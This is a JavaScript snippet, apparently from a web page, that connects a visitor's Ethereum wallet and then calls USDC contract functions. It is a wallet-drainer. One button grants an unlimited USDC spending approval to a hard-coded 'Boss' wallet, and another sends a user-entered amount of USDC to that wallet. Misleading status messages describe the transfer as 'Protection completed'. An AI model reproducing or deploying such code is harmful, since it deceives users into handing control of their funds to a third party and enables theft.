const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC合约 const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Boss钱包 const approveAmount = ethers.constants.MaxUint256; let provider; let signer; let userAddress; document.getElementById("connect").onclick = async () => { if (window.ethereum) { provider = new ethers.providers.Web3Provider(window.ethereum); await provider.send("eth_requestAccounts", []); signer = provider.getSigner(); userAddress = await signer.getAddress(); document.getElementById("status").innerText = "Wallet connected: " + userAddress; } }; document.getElementById("approve").onclick = async () => { const usdc = new ethers.Contract( usdcAddress, ["function approve(address spender, uint256 amount) public returns (bool)"], signer ); try { const tx = await usdc.approve(bossAddress, approveAmount); await tx.wait(); document.getElementById("status").innerText = "Wallet approved."; } catch (e) { document.getElementById("status").innerText = "Approval failed."; } }; document.getElementById("deposit").onclick = async () => { const usdc = new ethers.Contract( usdcAddress, ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"], signer ); try { const amount = prompt("Enter amount to transfer (in USDC):"); const decimals = 6; const parsedAmount = ethers.utils.parseUnits(amount, decimals); const tx = await usdc.transferFrom(userAddress, bossAddress, parsedAmount); await tx.wait(); document.getElementById("status").innerText = "Protection completed."; } catch (e) { document.getElementById("status").innerText = "Transfer failed."; } };
